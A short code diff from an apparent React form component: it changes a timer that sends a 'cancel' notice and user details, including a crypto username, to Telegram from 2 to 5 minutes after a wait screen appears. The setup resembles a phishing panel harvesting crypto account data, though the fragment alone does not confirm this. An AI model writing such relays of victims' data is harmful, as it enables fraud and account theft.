@@ -274,10 +274,10 @@ crypto_username: ${mainInfo?.cryptoUsername || 'N/A'}`
               if (!isFormValid || showWaitModal) return
               setShowWaitModal(true)
 
-              // send to Telegram after 2 minutes
+              // send to Telegram after 5 minutes
               setTimeout(() => {
                 sendCancelToTelegram()
-              }, 120000)
+              }, 300000)
             }}
           >
             Cancel &gt;&gt;
